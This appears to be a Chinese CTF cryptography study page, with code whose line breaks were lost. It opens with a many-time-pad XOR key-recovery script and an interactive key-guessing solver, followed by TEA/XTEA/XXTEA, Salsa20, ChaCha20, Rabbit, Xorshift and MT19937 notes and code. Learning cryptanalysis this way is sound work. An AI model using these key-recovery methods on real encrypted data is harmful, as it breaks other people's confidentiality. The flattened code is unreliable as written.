keyc1=&#x27;daaa4b4e8c996dc786889cd63bc4df4d1e7dc6f3f0b7a0b61ad48811f6f7c9bfabd7083c53ba54&#x27;c2=&#x27;c5a342468c8c7a88999a9dd623c0cc4b0f7c829acaf8f3ac13c78300b3b1c7a3ef8e193840bb&#x27;c3=&#x27;dda342458c897a8285df879e3285ce511e7c8d9afff9b7ff15de8a16b394c7bdab920e7946a05e9941d8308e&#x27;c4=&#x27;d9b05b4cd5ce7c8f938bd39e24d0df191d7694dfeaf8bfbb56e28900e1b8dff1bb985c2d5aa154&#x27;c5=&#x27;d9aa4b00c88b7fc79d99d38223c08d54146b88d3f0f0f38c03df8d52f0bfc1bda3d7133712a55e9948c32c8a&#x27;c6=&#x27;c4b60e46c9827cc79e9698936bd1c55c5b6e87c8f0febdb856fe8052e4bfc9a5efbe5c3f57ad4b9944de34&#x27;c7=&#x27;d9aa5700da817f94d29e81936bc4c1555b7b94d5f5f2bdff37df8252ffbecfb9bbd7152a12bc4fc00ad7229090&#x27;c8=&#x27;c4e24645cd9c28939a86d3982ac8c819086989d1fbf9f39e18d5c601fbb6dab4ef9e12795bbc549959d9229090&#x27;c9=&#x27;d9aa4b598c80698a97df879e2ec08d5b1e7f89c8fbb7beba56f0c619fdb2c4bdef8313795fa149dc0ad4228f&#x27;c10=&#x27;cce25d48d98a6c8280df909926c0de19143983c8befab6ff21d99f52e4b2daa5ef83143647e854d60ad5269c87&#x27;c11=&#x27;d9aa4b598c85668885df9d993f85e419107783cdbee3bbba1391b11afcf7c3bfaa805c2d5aad42995ede2cdd82977244&#x27;ciphers = [c1, c2, c3, c4, c5, c6, c7, c8, c9, c10, c11]# The target ciphertext we want to crack# XORs two stringdef strxor(a, b): # xor two strings (trims the longer input) return &quot;&quot;.join([chr(ord(x) ^ ord(y)) for (x, y) in zip(a, b)])def target_fix(target_cipher): print &#x27;-------begin-------&#x27; # To store the final key final_key = [None]*150 # To store the positions we know are broken known_key_positions = set() # For each ciphertext for current_index, ciphertext in enumerate(ciphers): counter = collections.Counter() # for each other ciphertext for index, ciphertext2 in enumerate(ciphers): if current_index != index: # don&#x27;t xor a ciphertext with itself for indexOfChar, char in enumerate(strxor(ciphertext.decode(&#x27;hex&#x27;), ciphertext2.decode(&#x27;hex&#x27;))): # Xor the two ciphertexts # If a character in the xored result is a alphanumeric character, it means there was probably a space character in one of the plaintexts (we don&#x27;t know which one) if char in string.printable and char.isalpha(): counter[indexOfChar] += 1 # Increment the counter at this index knownSpaceIndexes = [] # Loop through all positions where a space character was possible in the current_index cipher for ind, val in counter.items(): # If a space was found at least 7 times at this index out of the 9 possible XORS, then the space character was likely from the current_index cipher! if val &gt;= 7: knownSpaceIndexes.append(ind) #print knownSpaceIndexes # Shows all the positions where we now know the key! # Now Xor the current_index with spaces, and at the knownSpaceIndexes positions we get the key back! xor_with_spaces = strxor(ciphertext.decode(&#x27;hex&#x27;),&#x27; &#x27;*150) for index in knownSpaceIndexes: # Store the key&#x27;s value at the correct position final_key[index] = xor_with_spaces[index].encode(&#x27;hex&#x27;) # Record that we known the key at this position known_key_positions.add(index) # Construct a hex key from the currently known key, adding in &#x27;00&#x27; hex chars where we do not know (to make a complete hex string) final_key_hex = &#x27;&#x27;.join([val if val is not None else &#x27;00&#x27; for val in final_key]) # Xor the currently known key with the target cipher output = strxor(target_cipher.decode(&#x27;hex&#x27;),final_key_hex.decode(&#x27;hex&#x27;)) print &quot;Fix this sentence:&quot; print &#x27;&#x27;.join([char if index in known_key_positions else &#x27;*&#x27; for index, char in enumerate(output)])+&quot;\\n&quot; # WAIT.. MANUAL STEP HERE # This output are printing a * if that character is not known yet # fix the missing characters like this: &quot;Let*M**k*ow if *o&#123;*a&quot; = &quot;cure, Let Me know if you a&quot; # if is too hard, change the target_cipher to another one and try again # and we have our key to fix the entire text! #sys.exit(0) #comment and continue if u got a good key print &#x27;------end------&#x27; for i in ciphers: target_fix(i) 交互猜： 1234567891011121314151617181920212223242526from functools import reducedef xor(*args): if len(args) == 2: x, y = args return bytes([a ^ b for a, b in zip(x, y)]) return reduce(xor, args)ct = [ b&quot;\\xc1=\\x01&#125;\\xe7\\x1c\\x94YRj\\xb3\\xa7K@\\xde\\x0c\\x9a\\xc9\\x00\\xb0ZB\\r\\x87\\r\\x8b\\x8f\\xffQ\\xc7&quot;, b&quot;\\xfc\\x1d4^\\xd0o\\xb2GE|\\x89\\xe4^]\\xcfE\\x86\\xdd\\x1e\\x8a\\r@\\x1c\\x96r\\x92\\x87\\xec\\x19\\xd4&quot;, b&quot;\\xfa\\x19!P\\x82;\\xa8G\\x10\\x7f\\x80\\xa5DP\\xdeE\\x94\\xc8S\\x9cHH\\x1f\\x8a!\\x87\\xc0\\xe3\\x1f\\xcd&quot;,]key = xor(b&quot;SECFEST&#123;&quot;, ct[0])while True: pts = [xor(key, c) for c in ct] for i, pt in enumerate(pts): print(i, pt) idx = int(input(&quot;Enter index: &quot;)) if idx == -1: break c = input(&quot;Enter next char: &quot;)[0] key += bytes([ord(c) ^ ct[idx][len(key)]]) print(&quot;Current key:&quot;, key.hex())print([xor(key, c) for c in ct]) ​ TEA / XTEA / XXTEA TEA微型加密算法（Tiny Encryption Algorithm，TEA）是一种易于描述和执行的块密码，通常只需要很少的代码就可实现。TEA 操作处理在两个 32 位无符号整型上（可能源于一个 64 位数据），并且使用一个 128 位的密钥。设计者是 Roger Needham 和 David Wheeler。 加密过程： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758from Crypto.Util.number import *def encrypt(v, k): v0 = v[0] v1 = v[1] x = 0 delta = 0x9E3779B9 k0 = k[0] k1 = k[1] k2 = k[2] k3 = k[3] for i in range(32): x += delta x = x &amp; 0xFFFFFFFF v0 += ((v1 &lt;&lt; 4) + k0) ^ (v1 + x) ^ ((v1 &gt;&gt; 5) + k1) v0 = v0 &amp; 0xFFFFFFFF v1 += ((v0 &lt;&lt; 4) + k2) ^ (v0 + x) ^ ((v0 &gt;&gt; 5) + k3) v1 = v1 &amp; 0xFFFFFFFF v[0] = v0 v[1] = v1 return vdef decrypt(v, k): v0 = v[0] v1 = v[1] x = 0x9E3779B9 * 32 delta = 0x9E3779B9 k0 = k[0] k1 = k[1] k2 = k[2] k3 = k[3] for i in range(32): v1 -= ((v0 &lt;&lt; 4) + k2) ^ (v0 + x) ^ ((v0 &gt;&gt; 5) + k3) v1 = v1 &amp; 0xFFFFFFFF v0 -= ((v1 &lt;&lt; 4) + k0) ^ (v1 + x) ^ ((v1 &gt;&gt; 5) + k1) v0 = v0 &amp; 0xFFFFFFFF x -= delta x = x &amp; 0xFFFFFFFF v[0] = v0 v[1] = v1 return vplain = [1, 2]key = [2, 2, 3, 4]encrypted = []for i in range(len(plain)//2): now = encrypt(plain[2*i:2*(i+1)], key) encrypted += nowdecrypted = []final = b&#x27;&#x27;for i in range(len(encrypted)//2): now = decrypt(encrypted[2*i:2*(i+1)], key) decrypted += now final += long_to_bytes(now[0])[::-1] + long_to_bytes(now[1])[::-1]print(final) 1234567891011121314151617181920212223242526272829303132//C版，带符号位移(unsigned int -→ int)#include &lt;cstdint&gt;#include &lt;iso646.h&gt;#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;void decrypt(uint32_t *v, uint32_t *k)&#123; int v0 = v[0], v1 = v[1], i; uint32_t delta = 0x9E3779B9; uint32_t sum = delta * 32; uint32_t k0 = k[0], k1 = k[1], k2 = k[2], k3 = k[3]; for (i = 0; i &lt; 32; i++) &#123; v1 -= ((v0 &lt;&lt; 4) + k2) ^ (v0 + sum) ^ ((v0 &gt;&gt; 5) + k3); v0 -= ((v1 &lt;&lt; 4) + k0) ^ (v1 + sum) ^ ((v1 &gt;&gt; 5) + k1); sum -= delta; &#125; v[0] = v0; v[1] = v1;&#125;uint32_t enc[] = &#123;...&#125;;uint32_t key[4] = &#123;...&#125;;int main()&#123; for (int i = 0; i &lt; 16; i+=2) decrypt(enc + i, key); puts((char*)enc);&#125; XTEAXTEA 是 TEA 的升级版，增加了更多的密钥表，移位和异或操作等等。 加密过程： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950from Crypto.Util.number import *def encrypt(v, k): v0 = v[0] v1 = v[1] x = 0 delta = 0x9E3779B9 for i in range(32): v0 += (((v1 &lt;&lt; 4) ^ (v1 &gt;&gt; 5)) + v1) ^ (x + k[x &amp; 3]) v0 = v0 &amp; 0xFFFFFFFF x += delta x = x &amp; 0xFFFFFFFF v1 += (((v0 &lt;&lt; 4) ^ (v0 &gt;&gt; 5)) + v0) ^ (x + k[(x &gt;&gt; 11) &amp; 3]) v1 = v1 &amp; 0xFFFFFFFF v[0] = v0 v[1] = v1 return vdef decrypt(v, k): v0 = v[0] v1 = v[1] delta = 0x9E3779B9 x = delta * 32 for i in range(32): v1 -= (((v0 &lt;&lt; 4) ^ (v0 &gt;&gt; 5)) + v0) ^ (x + k[(x &gt;&gt; 11) &amp; 3]) v1 = v1 &amp; 0xFFFFFFFF x -= delta x = x &amp; 0xFFFFFFFF v0 -= (((v1 &lt;&lt; 4) ^ (v1 &gt;&gt; 5)) + v1) ^ (x + k[x &amp; 3]) v0 = v0 &amp; 0xFFFFFFFF v[0] = v0 v[1] = v1 return vplain = [1, 2]key = [2, 2, 3, 4]encrypted = []for i in range(len(plain)//2): now = encrypt(plain[2*i:2*(i+1)], key) encrypted += nowdecrypted = []final = b&#x27;&#x27;for i in range(len(encrypted)//2): now = decrypt(encrypted[2*i:2*(i+1)], key) decrypted += now final += long_to_bytes(now[0])[::-1] + long_to_bytes(now[1])[::-1]print(final) 123456789101112131415161718192021//C版，带符号#include&lt;stdio.h&gt;int map[2] = &#123;0xB5ABA743, 0x4C5B3EE0&#125;;void decode(int* v) &#123; int sum = 0; for(int i=0; i&lt;32; ++i) sum += 0x9E3779B9; int key[] = &#123;1, 2&#125;; for(int j=0; j&lt;32; ++j) &#123; v[1] -= (((v[0] &lt;&lt; 4) ^ (v[0] &gt;&gt; 5)) + v[0]) ^ (sum + key[sum &amp; 3]); v[0] -= (((v[1] &lt;&lt; 4) ^ (v[1] &gt;&gt; 5)) + v[1]) ^ (sum + key[sum &amp; 3]); sum -= 0x9E3779B9; &#125;&#125;int main() &#123; decode(map); for(int i=0; i&lt;2; ++i) printf(&quot;%d\\n&quot;, map[i]); return 0;&#125; XXTEAXXTEA，又称 Corrected Block TEA，是 XTEA 的升级版。 加密过程： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455from Crypto.Util.number import *def shift(z, y, x, k, p, e): return ((((z &gt;&gt; 5) ^ (y &lt;&lt; 2)) + ((y &gt;&gt; 3) ^ (z &lt;&lt; 4))) ^ ((x ^ y) + (k[(p &amp; 3) ^ e] ^ z)))def encrypt(v, k): delta = 0x9E3779B9 n = len(v) rounds = 6 + 52 // n x = 0 z = v[n - 1] for i in range(rounds): x = (x + delta) &amp; 0xFFFFFFFF e = (x &gt;&gt; 2) &amp; 3 for p in range(n - 1): y = v[p + 1] v[p] = (v[p] + shift(z, y, x, k, p, e)) &amp; 0xFFFFFFFF z = v[p] p += 1 y = v[0] v[n - 1] = (v[n - 1] + shift(z, y, x, k, p, e)) &amp; 0xFFFFFFFF z = v[n - 1] return vdef decrypt(v, k): delta = 0x9E3779B9 n = len(v) rounds = 6 + 52 // n x = (rounds * delta) &amp; 0xFFFFFFFF y = v[0] for i in range(rounds): e = (x &gt;&gt; 2) &amp; 3 for p in range(n - 1, 0, -1): z = v[p - 1] v[p] = (v[p] - shift(z, y, x, k, p, e)) &amp; 0xFFFFFFFF y = v[p] p -= 1 z = v[n - 1] v[0] = (v[0] - shift(z, y, x, k, p, e)) &amp; 0xFFFFFFFF y = v[0] x = (x - delta) &amp; 0xFFFFFFFF return vplain = [1, 2]key = [2, 2, 3, 4]encrypted = []encrypted = encrypt(plain, key)decrypted = decrypt(encrypted, key)final = b&#x27;&#x27;for i in range(len(decrypted)): final += long_to_bytes(decrypted[i])[::-1]print(final) ​ LFSR线性反馈移位寄存器（Linear feedback shift register，LFSR）是指给定前一状态的输出，将该输出的线性函数再用作输入的移位寄存器。线性反馈移位寄存器(LFSR)归属于移位寄存器(FSR)，除此之外还有非线性移位寄存器（NFSR）。 $\\text{GF}(2)$ 上一个 $n$ 级反馈移位寄存器由 $n$ 个二元存储器与一个反馈函数 $f(a_1,a_2,\\cdots,a_n)$ 组成： 移位寄存器三要素： 初始状态：由用户确定 反馈函数：$f(a_1,a_2,\\cdots,a_n)$ 是 $n$ 元布尔函数，即函数的自变量和因变量只取0和1这两个可能值 输出序列 如果反馈函数是线性的，那么我们称其为线性反馈移位寄存器(LFSR)： LFSR的输出序列 $\\{a_n\\}$ 满足： $\\begin{cases} a_{n+1} = c_1a_{n} \\oplus c_2a_{n-1} \\oplus\\cdots\\oplus c_na_1 \\newline a_{n+2} = c_1a_{n+1} \\oplus c_2a_{n} \\oplus\\cdots\\oplus c_na_2 \\newline \\vdots \\newline a_{n+i} = c_1a_{n+i-1} \\oplus c_2a_{n+i-2} \\oplus\\cdots\\oplus c_na_i \\end{cases}$ 对于 $n$ 级线性反馈移位寄存器，最长周期为 $2^n-1$（排除全0），达到最长周期的序列一般称为 $m$ 序列。 B-M 算法伯利坎普-梅西算法（Berlekamp-Massey algorithm，B-M）用来构造一个尽可能短的线性反馈移位寄存器（LFSR）来产生一个有限二元序列 $s^N$，同时，该算法也给出了 $s^N$ 的线性复杂度。该算法是一个多项式时间的迭代算法，以N长二元序列 $a_0,a_1,\\cdots,a_{N−1}$ 为输入，输出产生给序列式的最短LFSR的特征多项式 $f_N(x)$ ，该LFSR的线性复杂度 $L(s^N)$。 参考： De1CTF 2019 - Babylfsr 参考 深入分析CTF中的LFSR类题目（一） 深入分析CTF中的LFSR类题目（二） CTF竞赛密码学 之 LFSR ​ Salsa20Salsa20是一种流式对称加密算法，类似于Chacha20，算法性能相比AES能够快3倍以上。 Salsa20算法通过将32 Byte的key和8 Byte的随机数nonce扩展为 $2^{70}$ Byte的随机字节流，通过随机字节流和异或操作实现加解密，因此Salsa20算法中随机字节流的生成为关键所在。 Salsa20算法生成随机字节流时，一次生成一个64字节的block，每一个block是通过将key、nonce和block number以及部分常量组成64字节的input，通过核函数，输出64字节的output。最终多个block组成长度为 $2^{70}$ 的随机字节流，在生成过程中，每个block相互独立。 输入 64字节的input分为16个word，每个word为4字节，由以下8部分组成： 4字节的常量0x61707865key的前16字节4字节的常量0x3320646e8字节的随机数nonce8字节的block-counter4字节的常量0x79622d32key的剩余16字节4字节的常量0x6b206574 最终64字节（16 words）组成一个4*4的矩阵。例如，对于key (1, 2, 3, 4, 5, . . . , 32)，nonce(3, 1, 4, 1, 5, 9, 2, 6)，以及 block 7的初始矩阵为： 12340x61707865, 0x04030201, 0x08070605, 0x0c0b0a090x100f0e0d, 0x3320646e, 0x01040103, 0x060209050x00000007, 0x00000000, 0x79622d32, 0x141312110x18171615, 0x1c1b1a19, 0x201f1e1d, 0x6b206574 核函数 Salsa20算法核函数将64字节的输入以矩阵形式作为参数，输出64字节的运算结果。 Salsa20核函数运算主要包括的运算如下，其中a和b皆为32bit（4 Byte）的数据： 32 bit模加：(a + b) mod 2^32 异或：a XOR b 左移：a &lt;&lt;&lt; b，其中b为常量，在Salsa20算法中左移的值为7、9、13、18 针对输入矩阵中的每个word，执行20轮的如下操作： b ⊕= (a ⊞ c) &lt;&lt;&lt; k，其中⊕为异或，⊞模加，&lt;&lt;&lt;为左移。 经过20轮计算后，将输出的矩阵核原始矩阵相加，得到输出。 Salsa20核函数具体实现如下： 1234567891011121314151617181920212223242526#define R(a,b) (((a) &lt;&lt; (b)) | ((a) &gt;&gt; (32 - (b))))void salsa20_word_specification(uint32 out[16],uint32 in[16])&#123; int i; uint32 x[16]; for (i = 0;i &lt; 16;++i) x[i] = in[i]; for (i = 20;i &gt; 0;i -= 2) &#123; // 20轮计算 x[ 4] ^= R(x[ 0]+x[12], 7); x[ 8] ^= R(x[ 4]+x[ 0], 9); x[12] ^= R(x[ 8]+x[ 4],13); x[ 0] ^= R(x[12]+x[ 8],18); x[ 9] ^= R(x[ 5]+x[ 1], 7); x[13] ^= R(x[ 9]+x[ 5], 9); x[ 1] ^= R(x[13]+x[ 9],13); x[ 5] ^= R(x[ 1]+x[13],18); x[14] ^= R(x[10]+x[ 6], 7); x[ 2] ^= R(x[14]+x[10], 9); x[ 6] ^= R(x[ 2]+x[14],13); x[10] ^= R(x[ 6]+x[ 2],18); x[ 3] ^= R(x[15]+x[11], 7); x[ 7] ^= R(x[ 3]+x[15], 9); x[11] ^= R(x[ 7]+x[ 3],13); x[15] ^= R(x[11]+x[ 7],18); x[ 1] ^= R(x[ 0]+x[ 3], 7); x[ 2] ^= R(x[ 1]+x[ 0], 9); x[ 3] ^= R(x[ 2]+x[ 1],13); x[ 0] ^= R(x[ 3]+x[ 2],18); x[ 6] ^= R(x[ 5]+x[ 4], 7); x[ 7] ^= R(x[ 6]+x[ 5], 9); x[ 4] ^= R(x[ 7]+x[ 6],13); x[ 5] ^= R(x[ 4]+x[ 7],18); x[11] ^= R(x[10]+x[ 9], 7); x[ 8] ^= R(x[11]+x[10], 9); x[ 9] ^= R(x[ 8]+x[11],13); x[10] ^= R(x[ 9]+x[ 8],18); x[12] ^= R(x[15]+x[14], 7); x[13] ^= R(x[12]+x[15], 9); x[14] ^= R(x[13]+x[12],13); x[15] ^= R(x[14]+x[13],18); &#125; for (i = 0;i &lt; 16;++i) out[i] = x[i] + in[i]; // 输入矩阵经过20轮的计算结果和原始矩阵相加得到最终输出&#125; 输出 每一次核函数运算，都能够通过key、nonce、block-counter生成64字节的输出block，经过多次输入和核函数运算，将每一次的生成结果拼接最终组成长度为 $2^{70}$ 的字节流。 1234567891011121314# Encryptfrom Crypto.Cipher import Salsa20plaintext = b&#x27;Attack at dawn&#x27;secret = b&#x27;*Thirty-two byte (256 bits) key*&#x27;cipher = Salsa20.new(key=secret)msg = cipher.nonce + cipher.encrypt(plaintext)# Decryptfrom Crypto.Cipher import Salsa20secret = b&#x27;*Thirty-two byte (256 bits) key*&#x27;msg_nonce = msg[:8]ciphertext = msg[8:]cipher = Salsa20.new(key=secret, nonce=msg_nonce)plaintext = cipher.decrypt(ciphertext) ​ Chacha20Chacha20是ChaCha系列流密码，作为Salsa密码的改良版，具有更强的抵抗密码分析攻击的特性，“20”表示该算法有20轮的加密计算。 由于是流密码，故以字节为单位进行加密，安全性的关键体现在密钥流生成的过程，即所依赖的伪随机数生成器（PRNG）的强度，加密过程即是将密钥流与明文逐字节异或得到密文，反之，解密是将密文再与密钥流做一次异或运算得到明文。 1234567891011121314# Encryptfrom Crypto.Cipher import ChaCha20plaintext = b&#x27;Attack at dawn&#x27;secret = b&#x27;*Thirty-two byte (256 bits) key*&#x27;cipher = ChaCha20.new(key=secret)msg = cipher.nonce + cipher.encrypt(plaintext)# Decryptfrom Crypto.Cipher import ChaCha20secret = b&#x27;*Thirty-two byte (256 bits) key*&#x27;msg_nonce = msg[:8]ciphertext = msg[8:]cipher = ChaCha20.new(key=secret, nonce=msg_nonce)plaintext = cipher.decrypt(ciphertext) ​ RabbitRabbit 是一种高速流密码，于 2003 年在 FSE 研讨会上首次提出。Rabbit 使用一个 128 位密钥和一个 64 位初始化向量。该加密算法的核心组件是一个位流生成器，该流生成器每次迭代都会加密 128 个消息位。Rabbit 也是一种对称加密算法。 不加盐版本：https://asecuritysite.com/encryption/rabbit2 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230import collectionsimport hashlibimport randomimport rabbitimport binasciiimport sysdef enc_long(n): &#x27;&#x27;&#x27;Encodes arbitrarily large number n to a sequence of bytes. Big endian byte order is used.&#x27;&#x27;&#x27; s = &quot;&quot; while n &gt; 0: s = chr(n &amp; 0xFF) + s n &gt;&gt;= 8 return sWORDSIZE = 0x100000000rot08 = lambda x: ((x &lt;&lt; 8) &amp; 0xFFFFFFFF) | (x &gt;&gt; 24)rot16 = lambda x: ((x &lt;&lt; 16) &amp; 0xFFFFFFFF) | (x &gt;&gt; 16)def _nsf(u, v): &#x27;&#x27;&#x27;Internal non-linear state transition&#x27;&#x27;&#x27; s = (u + v) % WORDSIZE s = s * s return (s ^ (s &gt;&gt; 32)) % WORDSIZEclass Rabbit: def __init__(self, key, iv = None): &#x27;&#x27;&#x27;Initialize Rabbit cipher using a 128 bit integer/string&#x27;&#x27;&#x27; if isinstance(key, str): # interpret key string in big endian byte order if len(key) &lt; 16: key = &#x27;\\x00&#x27; * (16 - len(key)) + key # if len(key) &gt; 16 bytes only the first 16 will be considered k = [ord(key[i + 1]) | (ord(key[i]) &lt;&lt; 8) for i in range(14, -1, -2)] else: # k[0] = least significant 16 bits # k[7] = most significant 16 bits k = [(key &gt;&gt; i) &amp; 0xFFFF for i in range(0, 128, 16)] # State and counter initialization x = [(k[(j + 5) % 8] &lt;&lt; 16) | k[(j + 4) % 8] if j &amp; 1 else (k[(j + 1) % 8] &lt;&lt; 16) | k[j] for j in range(8)] c = [(k[j] &lt;&lt; 16) | k[(j + 1) % 8] if j &amp; 1 else (k[(j + 4) % 8] &lt;&lt; 16) | k[(j + 5) % 8] for j in range(8)] self.x = x self.c = c self.b = 0 self._buf = 0 # output buffer self._buf_bytes = 0 # fill level of buffer next(self) next(self) next(self) next(self) for j in range(8): c[j] ^= x[(j + 4) % 8] self.start_x = self.x[:] # backup initial key for IV/reset self.start_c = self.c[:] self.start_b = self.b if iv != None: self.set_iv(iv) def reset(self, iv = None): &#x27;&#x27;&#x27;Reset the cipher and optionally set a new IV (int64 / string).&#x27;&#x27;&#x27; self.c = self.start_c[:] self.x = self.start_x[:] self.b = self.start_b self._buf = 0 self._buf_bytes = 0 if iv != None: self.set_iv(iv) def set_iv(self, iv): &#x27;&#x27;&#x27;Set a new IV (64 bit integer / bytestring).&#x27;&#x27;&#x27; if isinstance(iv, str): i = 0 for c in iv: i = (i &lt;&lt; 8) | ord(c) iv = i c = self.c i0 = iv &amp; 0xFFFFFFFF i2 = iv &gt;&gt; 32 i1 = ((i0 &gt;&gt; 16) | (i2 &amp; 0xFFFF0000)) % WORDSIZE i3 = ((i2 &lt;&lt; 16) | (i0 &amp; 0x0000FFFF)) % WORDSIZE c[0] ^= i0 c[1] ^= i1 c[2] ^= i2 c[3] ^= i3 c[4] ^= i0 c[5] ^= i1 c[6] ^= i2 c[7] ^= i3 next(self) next(self) next(self) next(self) def __next__(self): &#x27;&#x27;&#x27;Proceed to the next internal state&#x27;&#x27;&#x27; c = self.c x = self.x b = self.b t = c[0] + 0x4D34D34D + b c[0] = t % WORDSIZE t = c[1] + 0xD34D34D3 + t // WORDSIZE c[1] = t % WORDSIZE t = c[2] + 0x34D34D34 + t // WORDSIZE c[2] = t % WORDSIZE t = c[3] + 0x4D34D34D + t // WORDSIZE c[3] = t % WORDSIZE t = c[4] + 0xD34D34D3 + t // WORDSIZE c[4] = t % WORDSIZE t = c[5] + 0x34D34D34 + t // WORDSIZE c[5] = t % WORDSIZE t = c[6] + 0x4D34D34D + t // WORDSIZE c[6] = t % WORDSIZE t = c[7] + 0xD34D34D3 + t // WORDSIZE c[7] = t % WORDSIZE b = t // WORDSIZE g = [_nsf(x[j], c[j]) for j in range(8)] x[0] = (g[0] + rot16(g[7]) + rot16(g[6])) % WORDSIZE x[1] = (g[1] + rot08(g[0]) + g[7]) % WORDSIZE x[2] = (g[2] + rot16(g[1]) + rot16(g[0])) % WORDSIZE x[3] = (g[3] + rot08(g[2]) + g[1]) % WORDSIZE x[4] = (g[4] + rot16(g[3]) + rot16(g[2])) % WORDSIZE x[5] = (g[5] + rot08(g[4]) + g[3]) % WORDSIZE x[6] = (g[6] + rot16(g[5]) + rot16(g[4])) % WORDSIZE x[7] = (g[7] + rot08(g[6]) + g[5]) % WORDSIZE self.b = b return self def derive(self): &#x27;&#x27;&#x27;Derive a 128 bit integer from the internal state&#x27;&#x27;&#x27; x = self.x return ((x[0] &amp; 0xFFFF) ^ (x[5] &gt;&gt; 16)) | \\ (((x[0] &gt;&gt; 16) ^ (x[3] &amp; 0xFFFF)) &lt;&lt; 16)| \\ (((x[2] &amp; 0xFFFF) ^ (x[7] &gt;&gt; 16)) &lt;&lt; 32)| \\ (((x[2] &gt;&gt; 16) ^ (x[5] &amp; 0xFFFF)) &lt;&lt; 48)| \\ (((x[4] &amp; 0xFFFF) ^ (x[1] &gt;&gt; 16)) &lt;&lt; 64)| \\ (((x[4] &gt;&gt; 16) ^ (x[7] &amp; 0xFFFF)) &lt;&lt; 80)| \\ (((x[6] &amp; 0xFFFF) ^ (x[3] &gt;&gt; 16)) &lt;&lt; 96)| \\ (((x[6] &gt;&gt; 16) ^ (x[1] &amp; 0xFFFF)) &lt;&lt; 112) def keystream(self, n): &#x27;&#x27;&#x27;Generate a keystream of n bytes&#x27;&#x27;&#x27; res = &quot;&quot; b = self._buf j = self._buf_bytes next = self.__next__ derive = self.derive for i in range(n): if not j: j = 16 next() b = derive() res += chr(b &amp; 0xFF) j -= 1 b &gt;&gt;= 1 self._buf = b self._buf_bytes = j return res def encrypt(self, data): &#x27;&#x27;&#x27;Encrypt/Decrypt data of arbitrary length.&#x27;&#x27;&#x27; res = &quot;&quot; b = self._buf j = self._buf_bytes next = self.__next__ derive = self.derive for c in data: if not j: # empty buffer =&gt; fetch next 128 bits j = 16 next() b = derive() res += chr(ord(c) ^ (b &amp; 0xFF)) j -= 1 b &gt;&gt;= 1 self._buf = b self._buf_bytes = j return res decrypt = encryptmessage=&quot;Hello&quot;key=&quot;qwerty&quot;iv=0key1 = hashlib.md5(key.encode()).hexdigest()print(&quot;Message:\\t\\t&quot;,message)print(&quot;IV:\\t&quot;,iv)print(&quot;Encryption password:\\t&quot;,key)print(&quot;Encryption key:\\t\\t&quot;,key1)print(&quot;\\n======Rabbit encryption========&quot;)iv=0msg=Rabbit(key1,iv).encrypt(message)print(&quot;Encrypted:\\t&quot;,binascii.hexlify(msg.encode()))text=Rabbit(key1,iv).decrypt(msg)print(&quot;Decrypted:\\t&quot;,text) ​ XorshiftXorshift 随机数生成器是 George Marsaglia 发明的一类伪随机数生成器。它们通过和自己逻辑移位后的数进行异或操作来生成序列中的下一个数。这在现代计算机体系结构非常快。它们是线性反馈移位寄存器的一个子类，其简单的实现使它们速度更快且使用更少的空间。然而，必须仔细选择合适参数以达到长周期。 问题：在循环移位异或加密中，我们已知变换后的密文 y ，以及多个偏移的密钥 ks ，要求出原文 x。 定理：在长度为 2 的方幂的二进制串中，循环移位异或变换中，如果有奇数项，那么这个变换是可逆的，否则就是不可逆的。 例： 加密：$y=x \\oplus (x \\ggg p) \\oplus (x \\ggg q)$ 解密：$x=x \\oplus (y \\ggg p) \\oplus (y \\ggg q)$ 123456789101112131415161718# y = x ^ (x&gt;&gt;&gt;p) ^ (x&gt;&gt;&gt;q)from operator import xorfrom functools import reducedef move(n, k): s = bin(n)[2:].zfill(64) k &amp;= 63 return int(s[k:] + s[:k], 2) def encrypt(x, ks): return xor(x, reduce(xor, map(lambda k: move(x, k), ks))) def decrypt(y, ks): for _ in range(6): y = encrypt(y, ks) ks = [k &lt;&lt; 1 for k in ks] return y ​ MT19937梅森旋转算法（Mersenne Twister Algorithm，简称 MT）是为了解决过去伪随机数发生器（Pseudo-Random Number Generator，简称 PRNG）产生的伪随机数质量不高而提出的新算法。该算法在 1997 年提出。 Mersenne Twister 最常见的实现方式使用 624 个 32 bits 的初始状态。这些整数按顺序分发（分发前对每个初始数进行转换），分发完后对该状态应用某种算法以获取下一组 624 个整数。以及可以通过得到连续的 624 个输出，还原出原来的 624 个 states，再根据原算法推算出接下来每个 state 下一次的 value，从而算出接下来的输出。 32 bits实现： 12345678910111213141516171819202122232425262728293031def _int32(x): return int(0xFFFFFFFF &amp; x) class MT19937: # 根据seed初始化624的state def __init__(self, seed): self.mt = [0] * 624 self.mt[0] = seed self.mti = 0 for i in range(1, 624): self.mt[i] = _int32(1812433253 * (self.mt[i - 1] ^ self.mt[i - 1] &gt;&gt; 30) + i) # 提取伪随机数 def extract_number(self): if self.mti == 0: self.twist() y = self.mt[self.mti] y = y ^ y &gt;&gt; 11 y = y ^ y &lt;&lt; 7 &amp; 2636928640 y = y ^ y &lt;&lt; 15 &amp; 4022730752 y = y ^ y &gt;&gt; 18 self.mti = (self.mti + 1) % 624 return _int32(y) # 对状态进行旋转 def twist(self): for i in range(0, 624): y = _int32((self.mt[i] &amp; 0x80000000) + (self.mt[(i + 1) % 624] &amp; 0x7fffffff)) self.mt[i] = (y &gt;&gt; 1) ^ self.mt[(i + 397) % 624] if y % 2 != 0: self.mt[i] = self.mt[i] ^ 0x9908b0df 分为三段： 导入seed，初始化伪随机数发生器 每次生成 mt[i] 是由前一项进行运算得到的，第一项 mt[0] == seed，总生成 624 项整数的列表（以及其他参数）作为 state。 中间的元组类型有 625 项，前 624 项即是之前提到的整数，而第 625 项（此时等于 624）是该 state 此时对应的第几个整数，也就是说，再下一次执行 extract_number() 函数时的 state 里面应该调用第几个整数。 进行 twist() 函数 注意是在 extract_number() 函数内可能会执行 twist()，进行 twist() 函数需要满足的条件，也就是每 624 项作为一轮直接执行 extract_number() 函数里后面的位运算以及抽取随机数的操作，而下一轮 624 项需要进行 twist() 函数替换state。 这样一来，就意味着每 624 项的列表作为一次 state，当输出完 624 个伪随机数之后，需要通过 twist() 函数变换 